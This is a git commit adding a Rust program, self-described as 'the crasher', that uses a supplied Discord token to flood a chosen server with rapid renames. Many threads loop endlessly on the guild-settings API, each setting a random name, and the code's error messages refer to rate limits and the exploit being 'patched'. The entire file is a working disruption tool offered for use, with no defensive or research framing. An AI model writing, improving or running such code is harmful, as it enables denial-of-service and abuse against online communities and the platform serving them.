cc69175ca60984fc40821b521057d732c172cbfa
Aldas <aldas@aldas.me>
2020-07-02 20:44:45 +0100

    added new branch

---
+++ src/main.rs
@@ -0,0 +1,105 @@
+use serde::Serialize;
+use reqwest::StatusCode;
+use clap::Clap;
+
+#[derive(Clap)]
+#[clap(version = "2.0", author = "Aldas <aldas.me>")]
+struct Opts {
+    #[clap(short, long)]
+    token: String,
+    #[clap(short, long)]
+    guild_id: usize,
+    #[clap(long, default_value = "10")]
+    threads: u16
+}
+
+fn main() {
+    println!("Starting the crasher...");
+    let opts: Opts = Opts::parse();
+    let options = std::sync::Arc::new(opts);
+    let threads: Vec<_> = (0..options.threads).map(|_| {
+        let opts = std::sync::Arc::clone(&options);
+        std::thread::spawn(move || {
+            loop {
+                run(&opts.token, opts.guild_id)
+            }
+        })
+    }).collect();
+    for thread in threads {
+        thread.join().unwrap();
+    };
+}
+
+fn run(token: &str, guild_id: usize) {
+    match change_settings(token, guild_id, GuildSettings{
+        afk_channel_id: None,
+        afk_timeout: None,
+        banner: None,
+        default_message_notifications: None,
+        description: None,
+        explicit_content_filter: None,
+        icon: None,
+        name: Some(rand_string()),
+        public_updates_channel_id: None,
+        region: None,
+        splash: None,
+        system_channel_flags: None,
+        system_channel_id: None,
+        verification_level: None
+    }) {
+        Ok(_) => log::info!("Changed succesfully"),
+        Err(text) => panic!("{}\nError has occured ^", text)
+    };
+}
+
+fn rand_string() -> String {
+    (0..4).map(|_| (0x20u8 + (rand::random::<f32>() * 96.0) as u8) as char).collect()
+}
+
+#[derive(Serialize)]
+struct GuildSettings {
+    #[serde(skip_serializing_if = "Option::is_none")]
+    afk_channel_id: Option<usize>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    afk_timeout: Option<u32>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    banner: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    default_message_notifications: Option<u8>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    description: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    explicit_content_filter: Option<u8>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    icon: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    name: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    public_updates_channel_id: Option<usize>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    region: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    splash: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    system_channel_flags: Option<u32>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    system_channel_id: Option<usize>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    verification_level: Option<u8>
+}
+
+fn change_settings(token: &str, guild_id: usize, settings: GuildSettings) -> Result<(), &str> {
+    let req = reqwest::blocking::Client::new()
+    .patch(&format!("https://discord.com/api/v6/guilds/{}", guild_id))
+    .header("authorization", token)
+    .json(&settings)
+    .send()
+    .unwrap();
+    match req.status() {
+        StatusCode::OK => return Ok(()),
+        StatusCode::FORBIDDEN => return Err("Forbidden"),
+        StatusCode::UNAUTHORIZED => return Err("Invalid token or you don't have permissions to manage that server!"),
+        StatusCode::TOO_MANY_REQUESTS => return Err("Got ratelimited. Either its trying to do something else or it has been patched."),
+        _ => return Err("Unknown error has occurred")
+    };
+}
